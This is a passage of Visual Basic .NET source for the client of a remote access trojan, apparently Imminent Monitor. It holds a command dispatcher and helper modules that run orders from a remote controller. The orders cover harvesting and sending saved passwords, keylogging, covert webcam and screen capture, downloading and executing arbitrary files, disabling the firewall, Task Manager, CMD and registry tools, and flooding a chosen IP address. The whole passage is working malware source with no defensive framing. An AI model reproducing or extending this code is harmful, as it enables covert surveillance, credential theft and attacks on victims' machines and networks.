                    DisableFunctions.DisableRegistry(True)
                    Exit Select
                Case CommandType.EnableReg
                    DisableFunctions.DisableRegistry(False)
                    Exit Select
                Case CommandType.DisableTask
                    Dim t As New Thread(AddressOf DisableFunctions.DisableTaskManager)
                    t.Start(True)
                    Exit Select
                Case CommandType.EnableTask
                    Dim t As New Thread(AddressOf DisableFunctions.DisableTaskManager)
                    t.Start(False)
                    Exit Select
                Case CommandType.DisableHidFolders
                    DisableFunctions.DisableHiddenFiles(True)
                    Exit Select
                Case CommandType.EnableHidFolders
                    DisableFunctions.DisableHiddenFiles(False)
                    Exit Select
                Case CommandType.OpenInputSocket
                    Dim T As New Thread(AddressOf InputManaging.StartRemoteInput)
                    T.Start(commandString.Split(SplitMark1)(1))
                    SendStatus("Input socket opened...")

                    Exit Select
                Case CommandType.Update
                    Dim DlThr As New Threading.Thread(AddressOf UpdateThread)
                    DlThr.IsBackground = True
                    DlThr.SetApartmentState(ApartmentState.STA)
                    DlThr.Start(commandString)
                    SendStatus("Update started...")
                    Exit Select
                Case CommandType.RemoteCam
                    Dim Splits() As String = commandString.Split(SplitMark1)
                    Dim NewRemoteWebcam As New Webcam(Splits(1), remoteHost, compilerSettings.remotePort, Splits(2), Splits(3))
                    SendStatus("Remote cam started...")
                Case CommandType.RegistryList
                    RegistryManaging.SendReg(commandString)
                    SendStatus("Registy items listed...")
                    Exit Select
                Case CommandType.RegistryCreateSubkey
                    RegistryManaging.CreateSubkey(Asc(commandString.Split(SplitMark1)(1)), commandString.Split(SplitMark1)(2), commandString.Split(SplitMark1)(3))
                    Exit Select
                Case CommandType.RegistryDelSubkey
                    RegistryManaging.DelRegSubkey(Asc(commandString.Split(SplitMark1)(1)), commandString.Split(SplitMark1)(2), commandString.Split(SplitMark1)(3))
                    Exit Select
                Case CommandType.RegistryCreateValue
                    RegistryManaging.CreateValue(Asc(commandString.Split(SplitMark1)(1)), Asc(commandString.Split(SplitMark1)(2)), commandString.Split(SplitMark1)(3), commandString.Split(SplitMark1)(4), commandString.Split(SplitMark1)(5))
                    Exit Select
                Case CommandType.ChatCredntials
                    Dim T As New Thread(AddressOf ShowChat)
                    T.Start(commandString.Split(SplitMark1)(1))
                    Exit Select
                Case CommandType.CloseChat
                    Dim Closethread As New Thread(AddressOf CloseChat)
                    Closethread.Start()
                    Exit Select
                Case CommandType.ReceiveChat
                    Rec(commandString.Split(SplitMark1)(1), commandString.Split(SplitMark1)(2))
                    Exit Select
                Case CommandType.InputRec
                    Dim InputBoxThread As New Thread(AddressOf PopInputBox)
                    InputBoxThread.SetApartmentState(ApartmentState.STA)
                    InputBoxThread.Start(commandString)
                    Exit Select
                Case CommandType.DeleteKeylog
                    Dim enc As New Encryption
                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Environment.UserName & ".txt")
                    Dim sr As New StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & Environment.UserName & ".txt")
                    sr.Write(enc.Encrypt("Imminent", "New Log Started " & Date.Now.ToString & vbNewLine))
                    sr.Close()
                    sr.Dispose()
                    SendStatus("Log deleted...")
                    Exit Select
                Case CommandType.TTS
                    Dim SAPI As Object
                    SAPI = CreateObject("SAPI.spvoice")
                    SAPI.Speak(commandString.Split(SplitMark1)(1))
                Case CommandType.QuickStartups
                    Dim Q As New QuickStartups
                    Q.SendQuickStartups(buf(1))
                    SendStatus("Startups sent...")
                    Exit Select

                Case CommandType.ReConnect

                    Application.Restart()
                    End
                Case CommandType.Ping
                    Send(Chr(CommandType.Ping))
                    Exit Select
                Case CommandType.AdvancedSysInfo
                    SendStatus("System information sent...")
                    Send(Chr(CommandType.AdvancedSysInfo) & SplitMark1 & SystemInformation.LAN & SplitMark1 & SystemInformation.OS & SplitMark1 & SystemInformation.ComputerName & SplitMark1 & SystemInformation.Username & SplitMark1 & CamControl.HasCam & SplitMark1 & SystemInformation.Antivirus & SplitMark1 & SystemInformation.Firewall & SplitMark1 & SystemInformation.Privileges & SplitMark1 & SystemInformation.Screens & SplitMark1 & SystemInformation.GetProcessorId() & SplitMark1 & SystemInformation.GetGraphicsCardName & SplitMark1 & SystemInformation.Battery & SplitMark1 & SystemInformation.getMacAddress & SplitMark1 & SystemInformation.GetRamUsage & SplitMark1 & SystemInformation.TimeSinceLastReboot & SplitMark1 & Application.ExecutablePath & SplitMark1 & My.Computer.Info.TotalPhysicalMemory)
                    Exit Select
                Case CommandType.LiveQuality
                    Try
                        If commandString.Split(Chr(118)).Length > 1 Then
                            For x = 1 To commandString.Split(Chr(118)).Length - 1
                                RemoteDesktop.Quality = commandString.Split(Chr(118))(x).Split(SplitMark1)(1)
                            Next
                        Else
                            RemoteDesktop.Quality = commandString.Split(SplitMark1)(1)
                        End If
                    Catch ex As Exception
                    End Try
                    Exit Select
                Case CommandType.Recovery

                    Dim R1 As New Recovery
                    Send(Chr(119) & R1.getPasswords)
                    SendStatus("Passwords sent...")
                    Exit Select
                Case CommandType.TCP
                    Send(Chr(120) & (ConnectionsManager.GetExtendedTCPdata))
                    SendStatus("TCP connections grabbed...")
                    Exit Select
                Case CommandType.MalwareRemoval
                    R.ScanThread()
                    SendStatus("Malware scanned...")
                    Exit Select
                Case CommandType.Disconnect
                    If compilerSettings.bsodProection Then SelfProtection.BSODUnProtect()
                    End
                Case CommandType.MalwareKill
                    Dim K As New Thread(AddressOf R.StartRemoval)
                    K.SetApartmentState(ApartmentState.STA)
                    K.Start(commandString.Remove(0, 1))
                    SendStatus("Swwping malware...")
                    Exit Select
                Case CommandType.ChatSettings
                    ChangeSettings(Asc(commandString.Substring(1, 1)), Asc(commandString.Substring(2, 1)))
                    Exit Select
                Case CommandType.CloseConnection
                    commandString = commandString.Remove(0, 1)
                    ConnectionsManager.KillConnection(commandString.Split(SplitMark1)(0), commandString.Split(SplitMark1)(1), commandString.Split(SplitMark1)(2), commandString.Split(SplitMark1)(3))
                    Exit Select
                Case CommandType.SendMonitors
                    Dim i As Integer = 0
                    For Each Sc In Screen.AllScreens
                        i = i + 1
                        Send(Chr(132) & i)
                    Next
                    Exit Select
                Case CommandType.DeleteQuickStartup
                    Dim Position As String = commandString.Split(QuickStartups.Split1)(0)
                    Dim Key As String = commandString.Split(QuickStartups.Split1)(1)
                    Exit Select
                Case CommandType.DeleteKey
                    Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
                    Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
                    Key.DeleteValue(commandString.Split(SplitMark1)(1))
                    Exit Select
                Case CommandType.Seeder
                    Dim U As New Seeder(commandString.Split(SplitMark1)(1))
                    Exit Select
                Case CommandType.ChangeID
                    compilerSettings.serverId = commandString.Split(SplitMark1)(1)
                    Send(Chr(CommandType.ChangeID) & SplitMark1 & commandString.Split(SplitMark1)(1))
                    Exit Select
                Case 226
                    Send(Chr(CommandType.SendDevices) & SplitMark1 & LoadDeviceList() & SplitMark1)
                    Exit Select
                Case CommandType.Stress
                    Dim ip As String = commandString.Split(SplitMark1)(1)
                    Dim port As Integer = CInt(commandString.Split(SplitMark1)(2))
                    S.StartFlood(CInt(commandString.Split(SplitMark1)(3)), ip, port)
                    Exit Select
                Case CommandType.StopStress
                    If StressTesting.Flooding = True Then
                        S.StopArme()
                    End If
                    S.StopUdp()
                    Send(Chr(140) & SplitMark1 & "Stopped Flooding...")
                    Exit Select
                Case CommandType.Screenshot
                    commandString.Split(SplitMark1)(1) = commandString.Split(SplitMark1)(1).Replace(" ", "")
                    commandString.Split(SplitMark1)(1) = commandString.Split(SplitMark1)(1).Trim
                    Dim Res As String
                    For Each c As Char In commandString.Split(SplitMark1)(1)
                        If IsNumeric(c) Then
                            Res = Res & c
                        End If
                    Next
                    ScreenShotManager.SendScreen(Res)
                    Exit Select
            End Select
        Catch ex As Exception
        End Try
    End Sub

#End Region

#Region "Invoking"
    Public Sub WriteCmdInput(ByVal cmdInput As String)
        remoteCmd.SendDataToCMD(cmdInput)
    End Sub
    Public Sub SendClipboardText()
        Send(Chr(CommandType.ClipBoard) & My.Computer.Clipboard.GetText)
    End Sub
    Dim F As Form
    Dim txtRecv As RichTextBox
    Dim txtSend As TextBox
    Public CloseB As Boolean = 0
    Dim HoldClip As Boolean = False
    Public Delegate Sub Invoker(ByVal Admin As Object)
    <DllImport("User32.dll", CharSet:=CharSet.Auto)> _
    Private Function SetWindowLongW(ByVal hWnd As HandleRef, ByVal nIndex As Integer, ByVal dwNewLong As IntPtr) As Integer
    End Function
    Const GWLP_HWNDPARENT As Integer = -8
    Dim consoleHWnd As IntPtr

    Public Sub ShowChat(ByVal Admin As Object)
        Try
            F = New Form
            F.Text = "Chat - You are speaking with " & Admin
            F.MinimizeBox = False
            F.MaximizeBox = False
            F.FormBorderStyle = FormBorderStyle.FixedSingle
            F.ShowIcon = False
            F.ShowInTaskbar = False
            F.Size = New Point(400, 350)
            F.StartPosition = FormStartPosition.CenterScreen
            F.Font = New Font("Verdana", 8)
            txtRecv = New Windows.Forms.RichTextBox
            txtRecv.Multiline = True
            txtRecv.Size = New Point(370, 265)
            txtRecv.Location = New Point(6, 11)
            txtRecv.ReadOnly = True
            txtRecv.BackColor = Color.White
            txtSend = New Windows.Forms.TextBox
            txtSend.Size = New Size(New Point(370, 20))
            txtSend.Location = New Point(6, 282)
            AddHandler F.FormClosing, AddressOf FormClosing
            AddHandler txtRecv.TextChanged, AddressOf TextChanged
            AddHandler txtSend.KeyDown, AddressOf txtSend_KeyDown
            AddHandler txtSend.MouseMove, AddressOf MouseMove
            F.Controls.Add(txtRecv)
            F.Controls.Add(txtSend)
            SetForm(F)
            SetWindowLongW(New HandleRef(F, F.Handle), GWLP_HWNDPARENT, consoleHWnd)

            Application.Run(F)
            F.TopMost = True
            SendStatus("Chat Initiated...")
        Catch ex As Exception
        End Try
    End Sub
    Public globalForm As New Form
    Public Sub SetForm(ByVal F As Form)
        On Error Resume Next
        globalForm = F
    End Sub
    Public Enum SettingIdentifier

        CursorClip = 4
        TopMost = 5
        CenterScreen = 6
    End Enum
    Public Sub ChangeSettings(ByVal Identifier As SettingIdentifier, ByVal BoolValue As Integer)
        On Error Resume Next
        Select Case Identifier
            Case SettingIdentifier.CursorClip
                If BoolValue = 2 Then
                    HoldClip = True
                Else
                    HoldClip = False
                End If
            Case SettingIdentifier.CenterScreen
                globalForm.Left = (Screen.PrimaryScreen.WorkingArea.Width - globalForm.Width) / 2
                globalForm.Top = (Screen.PrimaryScreen.WorkingArea.Height - globalForm.Height) / 2
            Case SettingIdentifier.TopMost
                If BoolValue = 2 Then
                    globalForm.TopMost = True
                Else
                    globalForm.TopMost = False
                End If
        End Select
    End Sub
    Public Sub MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs)
        On Error Resume Next
        If HoldClip Then Cursor.Clip = globalForm.Bounds
    End Sub
    Sub TextChanged(ByVal sender As Object, ByVal e As System.EventArgs)
        On Error Resume Next
        txtRecv.SelectionStart = txtRecv.TextLength
        txtRecv.ScrollToCaret()
    End Sub
    Public Sub FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs)
        On Error Resume Next
        If CloseB = 0 Then
            e.Cancel = True
        Else
            e.Cancel = False
        End If
    End Sub
    Private Sub txtSend_KeyDown(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyEventArgs)
        On Error Resume Next
        If txtSend.Text = "" Then
        Else
            If e.KeyCode = Keys.Enter Then
                AppendText(Color.ForestGreen, "You ")
                AppendText(Color.DimGray, txtSend.Text)
                Send(Chr(107) & SystemInformation.Username & SplitMark1 & txtSend.Text)
                txtSend.Clear()
                e.SuppressKeyPress = True
            End If
        End If
    End Sub
    Private Sub AppendText(ByVal c As Color, ByVal text As String)
        On Error Resume Next
        txtRecv.SelectionStart = txtRecv.TextLength
        txtRecv.SelectionLength = 0
        txtRecv.SelectionColor = c
        txtRecv.AppendText(text)
        txtRecv.SelectionColor = txtRecv.ForeColor
        txtRecv.AppendText(Environment.NewLine)
        txtRecv.AppendText(Environment.NewLine)
        globalForm.TopMost = True
    End Sub
    Public Sub CloseChat()
        Try
            CloseB = 1
            globalForm.Close()
        Catch ex As Exception

        End Try

    End Sub
    Public Sub Rec(ByVal User As String, ByVal Text As String)

        AppendText(Color.Blue, User)
        AppendText(Color.DimGray, Text)

    End Sub
#End Region

#Region "Downloading"
    Private Const StatusDownloading As Byte = &H1
    Private Const StatusDownloadError As Byte = &H3
    Private Const StatusExecuted As Byte = &H5
    Private Const StatusExecuteError As Byte = &H6
    Private Const UpdateFinished As Byte = &H8
    Public Sub DownloadThread(ByVal params As Object)
        Try
            Send(Chr(CommandType.downloaderStatus) & Chr(StatusDownloading))
            Dim urlPath As String = params.split(SplitMark1)(1)
            Dim filePath As String = Path.GetTempPath & params.split(SplitMark1)(2)
            Dim downloaderClient As New WebClient()
            downloaderClient.DownloadFile(urlPath, filePath)
            Try
                Process.Start(filePath)
                Send(Chr(CommandType.downloaderStatus) & Chr(StatusExecuted))
            Catch
                Try
                    Process.Start(filePath)
                    Send(Chr(CommandType.downloaderStatus) & Chr(StatusExecuted))
                Catch
                    Send(Chr(CommandType.downloaderStatus) & Chr(StatusExecuteError))
                End Try
            End Try
        Catch ex As Exception
            Send(Chr(CommandType.downloaderStatus) & Chr(StatusDownloadError))
        End Try
    End Sub
    Public Sub UpdateThread(ByVal params As Object)
        Try
            Send(Chr(CommandType.downloaderStatus) & Chr(StatusDownloading))
            Dim urlPath As String = params.split(SplitMark1)(1)
            Dim filePath As String = Path.GetTempPath & params.split(SplitMark1)(2)
            Dim downloaderClient As New WebClient()
            downloaderClient.DownloadFile(urlPath, filePath)
            Try
                Process.Start(filePath)
                Send(Chr(CommandType.downloaderStatus) & Chr(UpdateFinished))
                End
            Catch
                Try
                    Process.Start(filePath)
                    Send(Chr(CommandType.downloaderStatus) & Chr(UpdateFinished))
                    End
                Catch
                    Send(Chr(CommandType.downloaderStatus) & Chr(StatusExecuteError))
                End Try
            End Try
        Catch ex As Exception
            Send(Chr(CommandType.downloaderStatus) & Chr(StatusDownloadError))
        End Try
    End Sub
#End Region

#Region "Msgbox & Input"
    Public Sub Msg(ByVal Buf As Object)
        On Error Resume Next
        Dim MsgIcon As MessageBoxIcon = Nothing
        Dim Btn As MessageBoxButtons = Nothing
        Dim Text1 As String = Buf.Split(SplitMark1)(1)
        Dim Text2 As String = Buf.Split(SplitMark1)(2)
        Select Case Buf.Split(SplitMark1)(3)
            Case MsgIconEnum.Information
                MsgIcon = MessageBoxIcon.Information
            Case MsgIconEnum.MsgError
                MsgIcon = MessageBoxIcon.Error
            Case MsgIconEnum.Warning
                MsgIcon = MessageBoxIcon.Warning
            Case MsgIconEnum.Question
                MsgIcon = MessageBoxIcon.Question
            Case MsgIconEnum.MsgNothing
                MsgIcon = MessageBoxIcon.None
        End Select
        Select Case Buf.Split(SplitMark1)(4)
            Case MsgBtnEnum.YesNo
                Btn = MessageBoxButtons.YesNo
            Case MsgBtnEnum.OK
                Btn = MessageBoxButtons.OK
            Case MsgBtnEnum.OKCanel
                Btn = MessageBoxButtons.OKCancel
        End Select
        MessageBox.Show(New WindowWrapper(GetForegroundWindow), Text1, Text2, Btn, MsgIcon)
    End Sub
    Public Enum MsgIconEnum
        Information = 1
        MsgError = 2
        Warning = 4
        Question = 7
        MsgNothing = 8
    End Enum
    Public Enum MsgBtnEnum
        YesNo = 1
        OK = 2
        OKCanel = 4
    End Enum
    Public Sub PopInputBox(ByVal bufString As Object)
        Dim txt As String = InputBox(bufString.Split(SplitMark1)(1), "")
        If txt <> Nothing Then
            Send(Chr(108) & txt)
        Else
            Send(Chr(108) & "User didn't type anything back")
        End If
    End Sub
#End Region

#Region "Thumbnail desk sub"
    Public Sub StreamThumb()
        Try
            Dim memoryStream As MemoryStream = New MemoryStream
            Dim thumbnailImage As Image = Nothing
            thumbnailImage = ImageManaging.ConvertToJpeg(ImageManaging.ResizeImage(RemoteDesktop.TakeScreenshotWithGDI(), 640, 480), 80)
            thumbnailImage.Save(memoryStream, ImageFormat.Jpeg)
            Send(Chr(CommandType.ThumbTask) & Convert.ToBase64String(memoryStream.GetBuffer))
            memoryStream.Close()
            memoryStream.Dispose()
            GC.Collect()
        Catch ex As Exception
        End Try
    End Sub
#End Region

#Region "Command Type Enums"
    Public Enum CommandType
        MainInformation = 1
        RemoteDesktop = 2
        RemoteCam = 3
        RemoteKeylogger = 4
        ListenMicrophone = 5
        FileTransferDownload = 6
        FileTransferUpload = 7
        StartRemoteCMD = 8
        RemoteCMDInput = 9
        Processes = 10
        Windows = 11
        FilesFolders = 12
        SuspendProcess = 13
        ResumeProcess = 14
        KillProcess = 15
        FreezeWindow = 16
        UnfreezeWindow = 17
        SetText = 18
        WindowShow = 19
        WindowHide = 20
        CloseWindow = 21
        MinimizeWindow = 22
        RestoreWindow = 23
        GetActiveWindow = 24
        KeyDown = 25
        KeyUp = 26
        Uninstall = 29
        ShutdownComputer = 30
        RestartComputer = 31
        OpenCD = 32
        CloseCD = 33
        HideTask = 34
        ShowTask = 35
        LockTask = 36
        Unlocktask = 37
        MonOn = 38
        MonOff = 39
        MouseSwap = 40
        MouseReturn = 41
        SendToWebsite = 42
        HTML = 43
        VBS = 44
        Batch = 45
        Beep = 46
        Asterisk = 47
        Exclamation = 48
        Question = 49
        hand = 50
        HideDesktop = 51
        ShowDesktop = 52
        LockDesktop = 53
        UnlockDesktop = 54
        BlockInput = 55
        UnblockInput = 56
        HideStart = 57
        ShowStart = 58
        SendKeyBoardText = 59
        MsgBox = 60
        Downloader = 61
        OpenInputSocket = 62
        DeleteFile = 65
        DeleteFolder = 66
        CreateFolder = 69
        RenameFolder = 70
        Renamefile = 71
        Wallpaper = 72
        Upload = 74
        Download = 75
        DownloadExecTransfer = 76
        Executefile = 77
        ExecuteAsAdmin = 78
        Copy = 79
        ClipBoard = 80
        SetClipBoard = 81
        ServerVer = 86
        downloaderStatus = 87
        DisableFirewall = 88
        EnableFirewall = 89
        DisableCMD = 90
        EnableCMD = 91
        DisableReg = 92
        EnableReg = 93
        DisableTask = 94
        EnableTask = 95
        DisableHidFolders = 96
        EnableHidFolders = 97
        Update = 98
        RegistryList = 99
        RegistryDelSubkey = 100
        RegistryDelValue = 101
        RegistryCreateSubkey = 102
        RegistryCreateValue = 103
        ThumbTask = 104
        ChatCredntials = 105
        CloseChat = 106
        ReceiveChat = 107
        InputRec = 108
        DeleteKeylog = 109
        CloseCam = 110
        TTS = 111
        QuickStartups = 112
        ReConnect = 113
        Ping = 114
        AdvancedSysInfo = 115
        Thumbnail = 116
        IdleTime = 117
        LiveQuality = 118
        Recovery = 119
        TCP = 120
        GenericInfo = 121
        Disconnect = 122
        MalwareRemoval = 123
        MalwareKill = 124
        LogOff = 126
        Hibernate = 127
        Suspend = 128
        ChatSettings = 129
        CloseConnection = 131
        SendMonitors = 132
        DeleteQuickStartup = 133
        DeleteKey = 134
        ErrorHandler = 135
        Seeder = 136
        ChangeID = 137
        Status = 138
        SendDevices = 139
        Stress = 140
        StopStress = 141
        SendStatus = 142
        Screenshot = 194
    End Enum
#End Region

#Region "Window Handle"
    Dim allDev As FilterInfoCollection
    Private Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, ByVal cbVer As Integer) As Boolean
    Public Function LoadDeviceList() As String
        On Error Resume Next
        Dim ret As String = Nothing
        allDev = New FilterInfoCollection(FilterCategory.VideoInputDevice)
        For Each deviceInfo As FilterInfo In allDev
            ret += deviceInfo.Name & splitMark2
        Next
        Return ret
        'Dim strName As String = Space(100)
        'Dim strVer As String = Space(100)
        'Dim bReturn As Boolean
        'Dim ret As String = Nothing
        'Dim x As Integer = 0
        'Do
        '    bReturn = capGetDriverDescriptionA(x, strName, 100, strVer, 100)
        '    If bReturn Then ret += strName.Trim & splitMark2
        '    x += 1
        'Loop Until bReturn = False
        'Return ret
    End Function
    Const WM_ENDSESSION As Integer = &H16
    Const WM_QUERYENDSESSION As Integer = &H11
    Public Sub WndProc(ByRef m As Message)
        On Error Resume Next
        Select Case m.Msg
            Case WM_QUERYENDSESSION
                End
            Case WM_ENDSESSION
                End
        End Select
        WndProc(m)
    End Sub
#End Region

End Module

#End Region

#Region " Wrapper "
Public Class WindowWrapper

    Implements Windows.Forms.IWin32Window
    Public Sub New(ByVal handle As IntPtr)
        On Error Resume Next
        _hwnd = handle
    End Sub
    Public ReadOnly Property Handle() As IntPtr Implements System.Windows.Forms.IWin32Window.Handle
        Get
            Return _hwnd
        End Get
    End Property
    Private _hwnd As IntPtr

End Class
#End Region

#Region " Screenshot Manager "
Public Module ScreenShotManager
    Public Src As Screen = Screen.AllScreens(0)
    Public Sub SendScreen(ByVal Quality As Integer)
        On Error Resume Next
        Dim ScreenShot As Image = ImageManaging.ConvertToJpeg(TakeAPIscreenshot, Quality)
        Using ms As New MemoryStream()
            ScreenShot.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg)
            Dim imageBytes As Byte() = ms.ToArray()
            Send(Chr(194) & SplitMark1 & Convert.ToBase64String(imageBytes))
            ms.Close()
            ms.Dispose()
        End Using
    End Sub
    Public Function TakeAPIscreenshot() As Image
        Try
            Dim hSDC, hMDC As Integer
            Dim hBMP, hBMPOld As Integer
            Dim r As Integer
            hSDC = CreateDC("DISPLAY", "", "", "")
            hMDC = CreateCompatibleDC(hSDC)
            FW = GetDeviceCaps(hSDC, 8)
            FH = GetDeviceCaps(hSDC, 10)
            hBMP = CreateCompatibleBitmap(hSDC, FW, FH)
            hBMPOld = SelectObject(hMDC, hBMP)
            Dim bounds As Rectangle
            bounds = Src.Bounds
            r = BitBlt(hMDC, 0, 0, bounds.Width, bounds.Height, hSDC, bounds.X, bounds.Y, 13369376)
            hBMP = SelectObject(hMDC, hBMPOld)
            r = DeleteDC(hSDC)
            r = DeleteDC(hMDC)
            TakeAPIscreenshot = Image.FromHbitmap(New IntPtr(hBMP))
            DeleteObject(hBMP)
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
End Module
#End Region

#Region " Motion Detection "
Public Class MotionDetection
    Public lastBitmap As Bitmap
    Public decodeBitmap As Bitmap
    Public bitmapWidth As Integer
    Public bitmapHeight As Integer
    Public Sub New()
    End Sub
    Public Sub Encode(bmp As Bitmap, outStream As Stream, quality As Integer)
        On Error Resume Next
        If lastBitmap Is Nothing Then
            lastBitmap = bmp
            bitmapWidth = bmp.Width
            bitmapHeight = bmp.Height
            outStream.Write(BitConverter.GetBytes(bitmapWidth), 0, 4)
            outStream.Write(BitConverter.GetBytes(bitmapHeight), 0, 4)
            Dim bitmapData As Byte() = ConvertToJpeg(bmp, quality)
            outStream.Write(BitConverter.GetBytes(bitmapData.Length), 0, 4)
            outStream.Write(bitmapData, 0, bitmapData.Length)
            Return
        End If
        Dim bmpData As BitmapData = bmp.LockBits(New Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat)
        Dim lastBmpData As BitmapData = lastBitmap.LockBits(New Rectangle(0, 0, lastBitmap.Width, lastBitmap.Height), ImageLockMode.ReadWrite, bmp.PixelFormat)
        Dim Stride As Integer = Math.Abs(bmpData.Stride)
        Dim PixelSize As Integer = Stride / bmp.Width
        Dim RectHeightChanges As New List(Of Rectangle)()
        For i As Integer = 0 To bmp.Height - 1
            Dim Offset As Integer = i * Stride
            Dim src As New IntPtr(bmpData.Scan0.ToInt32() + Offset)
            Dim dest As New IntPtr(lastBmpData.Scan0.ToInt32() + Offset)
            If memcmp(src, dest, Stride) <> 0 Then
                If RectHeightChanges.Count > 0 Then
                    Dim rect As Rectangle = RectHeightChanges(RectHeightChanges.Count - 1)
                    If rect.Y + rect.Height = i Then
                        RectHeightChanges(RectHeightChanges.Count - 1) = New Rectangle(0, rect.Y, bmp.Width, rect.Height + 1)
                    Else
                        RectHeightChanges.Add(New Rectangle(0, i, bmp.Width, 1))
                    End If
                Else
                    RectHeightChanges.Add(New Rectangle(0, i, bmp.Width, 1))
                End If
            End If
        Next
        Dim LastChanges As New List(Of Rectangle)()
        For Each rect As Rectangle In RectHeightChanges
            For x As Integer = 0 To rect.Width - 1 Step 50
                Dim width As Integer
                Dim height As Integer
                If x + 50 > rect.Width Then
                    width = rect.Width - x
                Else
                    width = 50
                End If
                If rect.Y + rect.Height >= bmp.Height Then
                    height = bmp.Height - rect.Height
                Else
                    height = rect.Height
                End If
                For y As Integer = rect.Y To (rect.Y + rect.Height) - 1
                    Dim Offset As Integer = (y * Stride) + (x * PixelSize)
                    Dim src As New IntPtr(bmpData.Scan0.ToInt32() + Offset)
                    Dim dest As New IntPtr(lastBmpData.Scan0.ToInt32() + Offset)
                    If memcmp(src, dest, width * PixelSize) <> 0 Then
                        LastChanges.Add(New Rectangle(x, rect.Y, width, rect.Height))
                        Exit For
                    End If
                Next
            Next
        Next
        bmp.UnlockBits(bmpData)
        lastBitmap.UnlockBits(lastBmpData)
        For Each rect As Rectangle In LastChanges
            outStream.Write(BitConverter.GetBytes(rect.X), 0, 4)
            outStream.Write(BitConverter.GetBytes(rect.Y), 0, 4)
            bmpData = bmp.LockBits(New Rectangle(rect.X, rect.Y, rect.Width, rect.Height), ImageLockMode.[ReadOnly], bmp.PixelFormat)
            Using newBitmap As New Bitmap(rect.Width, rect.Height, bmpData.Stride, bmp.PixelFormat, bmpData.Scan0)
                Dim data As Byte() = ConvertToJpeg(newBitmap, quality)
                outStream.Write(BitConverter.GetBytes(data.Length), 0, 4)
                outStream.Write(data, 0, data.Length)
            End Using
            bmp.UnlockBits(bmpData)
        Next
        lastBitmap.Dispose()
        lastBitmap = bmp
    End Sub

    Private Function ConvertToJpeg(img As Bitmap, q As Integer) As Byte()
        On Error Resume Next
        Const ParamAmount As Integer = 1
        Dim qualityParam As New EncoderParameter(Imaging.Encoder.Quality, q)
        Dim jpegCodec As ImageCodecInfo = GetEncoderInfo("image/jpeg")
        Dim encoderParams As New EncoderParameters(ParamAmount)
        encoderParams.Param(0) = qualityParam
        Dim ms As New MemoryStream()
        img.Save(ms, jpegCodec, encoderParams)
        Return ms.GetBuffer()
    End Function
    Private Function GetEncoderInfo(mimeType As String) As ImageCodecInfo
        On Error Resume Next
        Dim codecs As ImageCodecInfo() = ImageCodecInfo.GetImageEncoders()
        For i As Integer = 0 To codecs.Length - 1
            If (codecs(i).MimeType = mimeType) Then
                Return codecs(i)
            End If
        Next
        Return Nothing
    End Function
End Class
#End Region

#Region " DisableFunctions "
Public Class DisableFunctions
    Public Shared Sub DisableFirewall(ByVal Status As Boolean)
        On Error Resume Next
        If Status = True Then
            Dim P As Process = New Process
            Const STR As String = "netsh.exe"
            P.StartInfo.Arguments = ("firewall set opmode disable")
            P.StartInfo.FileName = STR
            P.StartInfo.UseShellExecute = False
            P.StartInfo.RedirectStandardOutput = True
            P.StartInfo.CreateNoWindow = True
            P.Start()
            P.WaitForExit()
        Else
            Dim P As Process = New Process
            Dim str As String = "netsh.exe"
            P.StartInfo.Arguments = ("firewall set opmode enable")
            P.StartInfo.FileName = str
            P.StartInfo.UseShellExecute = False
            P.StartInfo.RedirectStandardOutput = True
            P.StartInfo.CreateNoWindow = True
            P.Start()
            P.WaitForExit()
        End If
    End Sub
    Public Shared Sub DisableRegistry(ByVal Status As Boolean)
        On Error Resume Next
        If Status = True Then
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord)
        Else
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0", Microsoft.Win32.RegistryValueKind.DWord)
        End If
    End Sub
    Public Shared Sub DisableTaskManager(ByVal Status As Object)

        While Status
            If Status = True Then
                Try
                    For Each tP As Process In Process.GetProcessesByName("taskmgr")
                        tP.Kill()
                    Next
                Catch ex As Exception
                End Try
                Dim p As New ProcessStartInfo()
                p.FileName = "taskmgr.exe"
                p.WindowStyle = ProcessWindowStyle.Hidden
                p.CreateNoWindow = False
                Process.Start(p)
                Process.GetProcessesByName("taskmgr")(0).WaitForExit()
                Thread.Sleep(1000)
            End If
            If Status = False Then
            End If
        End While
    End Sub
    Public Shared Sub DisableCMD(ByVal Status As Boolean)
        On Error Resume Next
        If Status = True Then
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord)
        Else
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", Microsoft.Win32.RegistryValueKind.DWord)
        End If
    End Sub
    Public Shared Sub DisableHiddenFiles(ByVal Status As Boolean)
        On Error Resume Next
        If Status = True Then
            Const regloc As String = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
            My.Computer.Registry.SetValue(regloc, "Hidden", "0", Microsoft.Win32.RegistryValueKind.DWord)
        Else
            Const regloc As String = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
            My.Computer.Registry.SetValue(regloc, "Hidden", "1", Microsoft.Win32.RegistryValueKind.DWord)
        End If
    End Sub
End Class
#End Region

#Region " QuickStartups "
Public Class QuickStartups
    Public Const Split1 As String = Chr(1)
    Public Const Split2 As String = Chr(2)
    Public Const FolderId As String = Chr(14)
    Public Const RegKeyId As String = Chr(15)
    Public Const QuickStartups As String = Chr(112)
